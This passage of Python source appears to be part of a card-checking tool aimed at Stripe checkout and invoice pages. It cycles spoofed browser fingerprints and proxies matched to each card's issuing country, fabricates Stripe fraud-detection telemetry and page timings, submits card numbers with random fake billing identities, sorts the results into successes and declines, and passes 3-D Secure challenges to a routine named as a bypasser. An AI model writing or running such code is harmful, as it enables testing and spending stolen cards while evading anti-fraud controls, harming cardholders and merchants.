                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": '"Android"',
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "impersonate": "chrome124", "platform": "Win32",
                "color_depth": "32", "screen_height": "1080", "screen_width": "1920",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            },
            {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "impersonate": "chrome124", "platform": "MacIntel",
                "color_depth": "30", "screen_height": "1050", "screen_width": "1680",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="124", "Google Chrome";v="124"',
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"macOS"',
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "impersonate": "chrome120", "platform": "Win32",
                "color_depth": "24", "screen_height": "1440", "screen_width": "2560",
                "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            },
            {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "impersonate": "chrome131", "platform": "Win32",
                "color_depth": "24", "screen_height": "1080", "screen_width": "1920",
                "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            },
        ]
        if cached_stripe_tokens and cached_stripe_tokens.get("_profile"):
            profile = cached_stripe_tokens["_profile"]
        else:
            profile = random.choice(BROWSER_PROFILES)

        bin_info = await BINLookup.lookup(card["card"])
        bin_country = bin_info.get("country", "")

        max_retries = 3
        for current_attempt in range(max_retries):
            try:
                loop = asyncio.get_running_loop()

                if current_attempt == 0:
                    proxy_data = self.proxy_data
                else:
                    if ProxyManager.db_pool is not None:
                        proxy_data = (await ProxyManager.get_geo_matched(user_id, bin_country)
                                      if bin_country
                                      else await ProxyManager.get_random(user_id))
                    else:
                        proxy_data = self.proxy_data

                proxies = None
                if proxy_data:
                    result["proxy_raw"] = proxy_data.get("raw") or proxy_data.get("server")
                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get("username") else ""
                    server = proxy_data["server"]
                    scheme = server.split("://")[0] if "://" in server else "http"
                    server_host = server.split("://")[-1]
                    proxy_url = f"{scheme}://{auth}{server_host}"
                    proxies = {"http": proxy_url, "https": proxy_url}

                # Scrape pk_live if not already set
                if not self.pk_live:
                    pk = await self._scrape_pk_live(proxies, profile)
                    if not pk:
                        result["error"] = "Cannot resolve pk_live for this URL"
                        result["decline_code"] = "missing_pk"
                        result["response_time"] = round(time.time() - start, 2)
                        return result

                is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith("pi_")
                is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith("seti_")
                origin_url = "https://invoice.stripe.com" if (is_pi or is_seti) else "https://checkout.stripe.com"
                checkout_page_url = self.full_page_url if self.full_page_url else f"https://checkout.stripe.com/c/pay/{self.cs_live}"

                headers = {
                    "authority": "api.stripe.com",
                    "accept": "application/json",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": origin_url,
                    "referer": checkout_page_url,
                    "user-agent": profile["user_agent"],
                }
                if self.stripe_account:
                    headers["Stripe-Account"] = self.stripe_account
                if "sec-ch-ua" in profile:
                    headers["sec-ch-ua"] = profile["sec-ch-ua"]
                if "sec-ch-ua-mobile" in profile:
                    headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                if "sec-ch-ua-platform" in profile:
                    headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

                address, tz_id, locale = await RandomData.get_address_and_timezone(proxy_url if proxies else None)

                if proxy_data and address.get("country"):
                    ProxyManager._geo_cache[proxy_data.get("server", "")] = address["country"]

                _cffi_session = cffi_requests.Session(impersonate=profile["impersonate"])
                if proxies:
                    _cffi_session.proxies = proxies

                # Warmup
                try:
                    warmup_headers = {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "accept-language": "en-US,en;q=0.9",
                        "user-agent": profile["user_agent"],
                    }
                    await loop.run_in_executor(
                        None, lambda: _cffi_session.get(
                            checkout_page_url, headers=warmup_headers, timeout=15))
                except Exception:
                    pass

                if cached_stripe_tokens and cached_stripe_tokens.get("muid"):
                    stripe_tokens = cached_stripe_tokens
                else:
                    stripe_tokens = await self.generate_stripe_telemetry(
                        profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
                    stripe_tokens["_profile"] = profile
                    result["_stripe_tokens"] = stripe_tokens

                try:
                    _beacon_src = "checkout" if not (is_pi or is_seti) else "invoice"
                    _radar_payload = json.dumps({
                        "v": 2, "id": stripe_tokens.get("muid", ""),
                        "k": self.pk_live, "t": "muid", "src": _beacon_src,
                    })
                    _radar_headers = {
                        "content-type": "application/json",
                        "origin": "https://js.stripe.com",
                        "referer": "https://js.stripe.com/",
                        "user-agent": profile["user_agent"],
                    }
                    await loop.run_in_executor(
                        None, lambda: _cffi_session.post(
                            "https://r.stripe.com/0",
                            headers=_radar_headers,
                            data=_radar_payload, timeout=5))
                except Exception:
                    pass

                import uuid as _uuid
                pm_idempotency = str(_uuid.uuid4())
                confirm_idempotency = str(_uuid.uuid4())
                timing_ms = random.randint(9000, 24000)

                _js_hash = await loop.run_in_executor(None, StripeAPIHitter._fetch_live_stripe_js_hash)
                _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"

                # Step 1: Tokenize
                pm_url = "https://api.stripe.com/v1/payment_methods"
                pm_data = {
                    "type": "card",
                    "card[number]": card.get("card") or card.get("number") or card.get("cc", ""),
                    "card[cvc]": card.get("cvc") or card.get("cvv", ""),
                    "card[exp_month]": card.get("month") or card.get("exp_month") or card.get("mm", ""),
                    "card[exp_year]": card.get("year") or card.get("exp_year") or card.get("yy", ""),
                }
                if self.tax_country:
                    address["country"] = self.tax_country
                    if self.tax_zip:
                        address["zip"] = self.tax_zip
                    else:
                        if self.tax_country == "DE":
                            address["zip"] = "10115"
                        elif self.tax_country == "US":
                            address["zip"] = "10001"
                        elif self.tax_country == "GB":
                            address["zip"] = "EC1A 1BB"
                        elif self.tax_country == "FR":
                            address["zip"] = "75001"
                        elif self.tax_country == "CA":
                            address["zip"] = "M5H 2N2"

                pm_data.update({
                    "billing_details[name]": RandomData.get_name(),
                    "billing_details[email]": self.locked_email if self.locked_email else RandomData.get_email(),
                    "billing_details[address][line1]": address["line1"],
                    "billing_details[address][city]": address["city"],
                    "billing_details[address][state]": address["state"],
                    "billing_details[address][postal_code]": address.get("zip", address.get("postal_code", "")),
                    "billing_details[address][country]": address["country"],
                    "payment_user_agent": _payment_user_agent,
                    "time_on_page": str(timing_ms),
                    "guid": stripe_tokens["guid"],
                    "muid": stripe_tokens["muid"],
                    "sid": stripe_tokens["sid"],
                    "key": self.pk_live,
                })

                if self.cs_live and isinstance(self.cs_live, str) and self.cs_live.startswith(("cs_live_", "cs_test_")):
                    pm_data.update({
                        "client_attribution_metadata[client_session_id]": self.cs_live,
                        "client_attribution_metadata[merchant_integration_source]": "checkout",
                        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                    })
                    if self._init_json and self._init_json.get("config_id"):
                        pm_data["client_attribution_metadata[checkout_config_id]"] = self._init_json["config_id"]

                # Elements pre-flight
                try:
                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type=payment&payment_pages_checkout_session={self.cs_live}"
                    el_headers = headers.copy()
                    el_headers["referer"] = checkout_page_url
                    el_headers["accept-language"] = "en-US,en;q=0.9"
                    el_headers["Stripe-Version"] = "2026-04-22.dahlia"
                    await loop.run_in_executor(
                        None, lambda: _cffi_session.get(
                            elements_url, headers=el_headers, timeout=10))
                except Exception:
                    pass

                pm_headers = headers.copy()
                pm_headers["Idempotency-Key"] = pm_idempotency
                pm_headers["accept-language"] = "en-US,en;q=0.9"
                pm_headers["referer"] = checkout_page_url
                if self.stripe_account:
                    pm_headers["Stripe-Account"] = self.stripe_account
                pm_res = await loop.run_in_executor(
                    None, lambda: _cffi_session.post(
                        pm_url, headers=pm_headers, data=pm_data, timeout=30))
                pm_json = pm_res.json()

                if "id" not in pm_json:
                    err = pm_json.get("error", {})
                    result["decline_code"] = err.get("decline_code") or err.get("code") or err.get("type", "pm_token_failed")
                    result["error"] = err.get("message", "Failed to generate payment method token")
                    result["raw_response"] = pm_json
                    return result

                pm_id = pm_json["id"]

                # Step 2: Confirm
                if is_pi:
                    pi_id = self.cs_live.split("_secret_")[0]
                    confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "return_url": checkout_page_url,
                        "key": self.pk_live,
                        "client_secret": self.cs_live,
                    }
                    if self.raw_amount is None or self.raw_amount == 0:
                        confirm_data["save_payment_method"] = "true"
                        confirm_data["allow_redisplay"] = "always"
                    if self.raw_amount is not None and self.raw_amount > 0:
                        confirm_data["expected_amount"] = str(self.raw_amount)
                elif is_seti:
                    seti_id = self.cs_live.split("_secret_")[0]
                    confirm_url = f"https://api.stripe.com/v1/setup_intents/{seti_id}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "mandate_data[customer_acceptance][type]": "online",
                        "mandate_data[customer_acceptance][online][infer_from_client]": "true",
                        "client_context[currency]": "usd",
                        "client_context[mode]": "setup",
                        "client_context[payment_method_types][0]": "card",
                        "client_context[setup_future_usage]": "off_session",
                        "return_url": checkout_page_url,
                        "key": self.pk_live,
                        "client_secret": self.cs_live,
                    }
                    if self.raw_amount is None or self.raw_amount == 0:
                        confirm_data["save_payment_method"] = "true"
                        confirm_data["allow_redisplay"] = "always"
                else:
                    confirm_url = f"https://api.stripe.com/v1/payment_pages/{self.cs_live}/confirm"
                    confirm_data = {
                        "payment_method": pm_id,
                        "expected_payment_method_type": "card",
                        "consent[terms_of_service]": "accepted",
                        "key": self.pk_live,
                        "client_attribution_metadata[client_session_id]": self.cs_live,
                        "client_attribution_metadata[merchant_integration_source]": "checkout",
                        "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
                        "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                    }
                    if self._init_json:
                        if self._init_json.get("config_id"):
                            confirm_data["client_attribution_metadata[checkout_config_id]"] = self._init_json["config_id"]
                        if self._init_json.get("init_checksum"):
                            confirm_data["init_checksum"] = self._init_json["init_checksum"]
                    if self.raw_amount is not None:
                        confirm_data["expected_amount"] = str(self.raw_amount)
                    elif self._init_json:
                        tot = (self._init_json.get("total_summary") or {}).get("total")
                        if tot is None:
                            tot = (self._init_json.get("total_summary") or {}).get("due")
                        if tot is None:
                            tot = (self._init_json.get("adaptive_pricing_info") or {}).get("integration_amount")
                        if tot is None:
                            tot = (self._init_json.get("payment_intent") or {}).get("amount")
                        if tot is not None:
                            confirm_data["expected_amount"] = str(tot)

                confirm_headers = headers.copy()
                confirm_headers["Idempotency-Key"] = confirm_idempotency
                confirm_headers["accept-language"] = "en-US,en;q=0.9"
                confirm_headers["referer"] = checkout_page_url
                if self.stripe_account:
                    confirm_headers["Stripe-Account"] = self.stripe_account
                confirm_res = await loop.run_in_executor(
                    None, lambda: _cffi_session.post(
                        confirm_url, headers=confirm_headers, data=confirm_data, timeout=30))
                confirm_json = confirm_res.json()

                result["response_time"] = round(time.time() - start, 2)

                # Basic classification
                if confirm_res.status_code == 200 and "error" not in confirm_json:
                    pi = confirm_json.get("payment_intent", {})
                    si = confirm_json.get("setup_intent", {})
                    intent_id = pi.get("id") if isinstance(pi, dict) and pi.get("id") else (si.get("id") if isinstance(si, dict) else None)
                    client_secret = pi.get("client_secret") if isinstance(pi, dict) and pi.get("client_secret") else (si.get("client_secret") if isinstance(si, dict) else None)
                    if not intent_id or not client_secret:
                        fallback_id, fallback_secret = extract_intent_details(confirm_json)
                        intent_id = intent_id or fallback_id
                        client_secret = client_secret or fallback_secret

                    if isinstance(pi, dict) and pi.get("last_payment_error"):
                        err = pi.get("last_payment_error")
                        result["decline_code"] = err.get("decline_code") or err.get("code") or err.get("type", "open")
                        result["error"] = err.get("message", "Unknown error")
                        result["raw_response"] = confirm_json
                        return result

                    if isinstance(si, dict) and si.get("last_setup_error"):
                        err = si.get("last_setup_error")
                        result["decline_code"] = err.get("decline_code") or err.get("code") or err.get("type", "open")
                        result["error"] = err.get("message", "Unknown error")
                        result["raw_response"] = confirm_json
                        return result

                    status = confirm_json.get("status")
                    next_action = confirm_json.get("next_action", {})
                    if isinstance(pi, dict):
                        if pi.get("status"):
                            status = pi.get("status")
                        if pi.get("next_action"):
                            next_action = pi.get("next_action")
                    elif isinstance(si, dict):
                        if si.get("status"):
                            status = si.get("status")
                        if si.get("next_action"):
                            next_action = si.get("next_action")

                    if status in ["succeeded", "requires_capture", "complete"]:
                        result["success"] = True
                        result["raw_response"] = confirm_json
                        _curl = (
                            confirm_json.get("return_url")
                            or confirm_json.get("success_url")
                            or confirm_json.get("redirect_to_url", {}).get("url")
                            or (isinstance(pi, dict) and pi.get("next_action", {}).get("redirect_to_url", {}).get("url"))
                            or find_receipt_url(confirm_json)
                        )
                        if _curl:
                            result["confirm_url"] = _curl
                        return result

                    if status in ["requires_action", "requires_source_action"]:
                        result["raw_response"] = confirm_json
                        # 3DS handoff — worker calls Unified3DS2Bypasser on raw_response
                        try:
                            _hitter_cookies = {}
                            if hasattr(_cffi_session, "cookies"):
                                try:
                                    _hitter_cookies = dict(_cffi_session.cookies)
                                except Exception:
                                    pass
                            bypasser_res = await Stripe3DSBypasser.resolve_3ds(
                                result,
                                proxy_data=self.proxy_data,
                                profile=profile,
                                cookies=_hitter_cookies,
                            )
                            if bypasser_res and bypasser_res.get("success"):
                                return bypasser_res
                        except Exception:
                            pass
                        return result

                # Error path
                err = confirm_json.get("error", {})
                result["decline_code"] = err.get("decline_code") or err.get("code") or "declined"
                result["error"] = err.get("message", "Card declined")
                result["raw_response"] = confirm_json
                return result

            except Exception as ex:
                err_str = str(ex)
                result["response_time"] = round(time.time() - start, 2)
                is_timeout = "timed out" in err_str.lower() or "timeout" in err_str.lower() or "connection" in err_str.lower() or "curl: (28)" in err_str
                if is_timeout and current_attempt < max_retries - 1:
                    continue
                result["decline_code"] = "exception"
                result["error"] = err_str[:150]
                return result

        result["decline_code"] = "proxy_timeout"
        result["error"] = f"All {max_retries} attempts failed"
        result["response_time"] = round(time.time() - start, 2)
        return result

    async def generate_stripe_telemetry(self, profile: dict, proxies: dict,
                                         address: dict, page_url: str = None,
                                         session=None) -> Dict[str, str]:
        import uuid as _uuid
        fallback = {"muid": str(_uuid.uuid4()), "sid": str(_uuid.uuid4()), "guid": str(_uuid.uuid4())}
        try:
            tz_map = {"US": -300, "CA": -300, "GB": 0, "AU": -600, "FR": -60,
                      "DE": -60, "JP": -540, "IN": -330, "BR": 180, "SG": -480,
                      "KR": -540, "IT": -60, "ES": -60, "NL": -60, "SE": -60, "MX": 360}
            country = (address or {}).get("country", "US")
            if len(country) > 2:
                country = country.upper()[:2]
            tz_offset = tz_map.get(country, -300)

            locale_map = {"US": "en-US", "IN": "en-IN", "GB": "en-GB", "DE": "de-DE", "FR": "fr-FR", "BR": "pt-BR"}
            locale = locale_map.get(country, "en-US")

            is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith("pi_")
            is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith("seti_")
            if page_url:
                landing_url = page_url
            elif is_pi or is_seti:
                landing_url = f"https://invoice.stripe.com/i/{self.cs_live}"
            else:
                landing_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"

            _tel_src = "js-tokenize-inner-v3" if (is_pi or is_seti) else "checkout-inner-live-v3"
            payload = {
                "v": 2, "tag": "5.6.8_js_fp", "src": _tel_src,
                "a": {
                    "a": self.pk_live,
                    "b": landing_url,
                    "c": int(profile.get("color_depth", "24")),
                    "d": f"{profile.get('screen_width', '1920')}x{profile.get('screen_height', '1080')}",
                    "e": False,
                    "f": locale,
                    "g": profile.get("platform", "Win32"),
                    "h": profile["user_agent"],
                    "i": tz_offset,
                    "j": False,
                    "k": 8, "l": 8, "m": "", "n": "", "o": "",
                },
            }
            loop = asyncio.get_running_loop()
            tel_headers = {
                "content-type": "application/json",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": profile["user_agent"],
            }
            if self.stripe_account:
                tel_headers["Stripe-Account"] = self.stripe_account
            if "sec-ch-ua" in profile:
                tel_headers["sec-ch-ua"] = profile["sec-ch-ua"]
            if "sec-ch-ua-mobile" in profile:
                tel_headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
            if "sec-ch-ua-platform" in profile:
                tel_headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]

            if session is not None:
                tel_res = await loop.run_in_executor(
                    None, lambda: session.post(
                        "https://m.stripe.com/6",
                        headers=tel_headers, json=payload, timeout=10))
            else:
                tel_res = await loop.run_in_executor(
                    None, lambda: cffi_requests.post(
                        "https://m.stripe.com/6",
                        headers=tel_headers, json=payload,
                        proxies=proxies, timeout=10,
                        impersonate=profile["impersonate"]))
            if tel_res.status_code == 200:
                t = tel_res.json()
                return {
                    "muid": t.get("muid") or fallback["muid"],
                    "sid": t.get("sid") or fallback["sid"],
                    "guid": t.get("guid") or fallback["guid"],
                }
        except Exception:
            pass
        return fallback